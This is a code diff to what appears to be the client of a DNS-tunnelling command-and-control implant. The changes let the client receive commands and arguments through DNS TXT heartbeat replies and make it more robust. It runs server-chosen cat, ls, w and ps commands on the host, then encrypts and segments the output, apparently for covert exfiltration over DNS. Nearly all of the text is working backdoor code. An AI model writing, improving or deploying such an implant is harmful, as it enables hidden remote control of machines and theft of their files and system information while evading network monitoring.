@@ -67,9 +67,12 @@ class Client:
 
     def hb(self) -> Optional[Tuple[str, str]]:
         try:
-            answer = self.sender.query(client_to_serv["HB"], "A", source_port=self.source_port)
-            return answer.response.answer[0].items[0].address, ""  # TODO: ARG?????????????????????????
-        except Exception:
+            answer = self.sender.query(client_to_serv["HB"], "TXT", source_port=self.source_port)
+            if len(answer.response.answer[0]) > 1:
+                return answer.response.answer[0].items[0].strings[0].decode("utf-8"), \
+                       answer.response.answer[0].items[1].strings[0].decode("utf-8")
+            return answer.response.answer[0].items[0].strings[0].decode("utf-8"), ""
+        except Exception as e:
             return None
 
     def do_send_hb(self):
@@ -95,21 +98,25 @@ class Client:
     def carry_out_command(self, command, arg):
         self.__log("Carrying out command: {}, with args: {}".format(command, arg))
 
-        if command == serv_to_client["NOP"]:
-            self.__log("Got NOP.")
-            return
-        elif command == serv_to_client["CAT"]:
-            output = subprocess.check_output("cat", arg)
-        elif command == serv_to_client["LS"]:
-            output = subprocess.check_output("ls", arg)
-        elif command == serv_to_client["W"]:
-            output = subprocess.check_output(['w', '-o'])
-        elif command == serv_to_client["PS"]:
-            output = subprocess.check_output(['ps', 'au'])
+        try:
+            if command == serv_to_client["NOP"]:
+                self.__log("Got NOP.")
+                return
+            elif command == serv_to_client["CAT"]:
+                output = subprocess.check_output(["cat", arg])
+            elif command == serv_to_client["LS"]:
+                output = subprocess.check_output(["ls", arg])
+            elif command == serv_to_client["W"]:
+                output = subprocess.check_output(['w', '-o'])
+            elif command == serv_to_client["PS"]:
+                output = subprocess.check_output(['ps', 'au'])
 
-        else:
-            self.__log("Unknown command: {}".format(command))
-            return
+            else:
+                self.__log("Unknown command: {}".format(command))
+                return
+        except Exception as e:
+            self.__log("Command thrown an exception. Sending Exception: {}".format(e))
+            output = bytes(str(e), "utf-8")
 
         data = self.encrypt(output)
         segments = self.to_segments(data)
